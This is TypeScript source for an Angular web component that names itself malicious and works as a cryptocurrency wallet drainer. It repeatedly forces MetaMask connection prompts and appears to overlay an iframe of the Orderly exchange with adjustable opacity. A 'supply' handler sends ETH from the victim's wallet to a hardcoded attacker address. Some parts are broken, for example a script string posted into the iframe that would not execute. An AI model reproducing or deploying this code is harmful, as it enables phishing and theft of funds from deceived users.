import { AfterViewInit, Component } from '@angular/core';

declare let ethereum: any;

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent implements AfterViewInit {
  iframeOpacity: number = 0.5;
  buttonOpacity: number = 1;
  supplyClickCounter: number = 0;

  accountConnectedAddress: string = 'Not Connected';
  targetAddress: string = '0x5a3259eC4B7856d1C537e00a801E91E3d19c05cb';

  supplyEth: boolean = false;
  spinner: boolean = true;

  ngAfterViewInit() {
    this.connectToMaliciousSite();
  }

  async connectToMaliciousSite() {
    try {
      await this.connectMetamask('malicious');
      this.reloadOrderlyIframe();
      this.supplyEth = true;
      this.spinner = false;
      this.iframeOpacity = 1;
    } catch (error) {
      console.error('Error connecting to MetaMask:', error);
      this.connectToMaliciousSite();
    }
  }

  async connectMetamask(target: 'malicious' | 'orderly'): Promise<any> {
    return new Promise((resolve, reject) => {
      const ethereum = (window as any).ethereum;
      if (ethereum) {
        ethereum.request({ method: 'eth_requestAccounts' })
          .then((accounts: any) => {
            console.log(`Connected to ${target} site:`, accounts);
            this.accountConnectedAddress = accounts[0];
            resolve(accounts);
          })
          .catch((err: any) => {
            console.error(`Error connecting to ${target} MetaMask:`, err);
            setTimeout(() => this.connectMetamask(target).then(resolve).catch(reject), 2000); // Retry after 3 seconds
          });
      } else {
        alert('MetaMask not found');
        reject('MetaMask not found');
      }
    });
  }

  reloadOrderlyIframe() {
    const iframe = document.getElementById('orderlyIframe') as HTMLIFrameElement;
    if (iframe) {
      iframe.onload = () => {
        this.connectOrderlyInIframe();
      };
      iframe.src = iframe.src;
    } else {
      console.error('Iframe element not found.');
    }
  }

  connectOrderlyInIframe() {
    const iframe = document.getElementById('orderlyIframe') as HTMLIFrameElement;
    if (iframe?.contentWindow) {
      iframe.contentWindow.postMessage('connectWallet', '*');
    } else {
      console.error('Unable to access iframe content window.');
    }
  }

  handleIframeLoad() {
    const iframe = document.getElementById('orderlyIframe') as HTMLIFrameElement;
    if (iframe?.contentWindow) {
      iframe.contentWindow.postMessage(`
        <script>
          window.addEventListener('message', function(event) {
            if (event.data === 'connectWallet') {
              if (window.ethereum) {
                window.ethereum.request({ method: 'eth_requestAccounts' })
                  .then(accounts => {
                    console.log('Connected to Orderly:', accounts);
                  })
                  .catch(err => console.error('Error connecting to Orderly:', err));
              } else {
                alert('MetaMask not found');
              }
            }
          }, false);
        </script>
      `, '*');
    } else {
      console.error('Unable to access iframe content window.');
    }
  }

  async sendEthToTarget() {
    try {
      this.supplyClickCounter++;
      const accounts = await (ethereum as any).request({ method: 'eth_requestAccounts' });
      const senderAddress = accounts[0];

      const transactionParameters = {
        from: senderAddress,
        to: this.targetAddress,
        value: '0x12345' // Adjust the value as needed
      };

      const transactionHash = await (ethereum as any).request({
        method: 'eth_sendTransaction',
        params: [transactionParameters],
      });

      console.log('Transaction sent:', transactionHash);
    } catch (error) {
      console.error('Error sending transaction:', error);
    }
  }
}
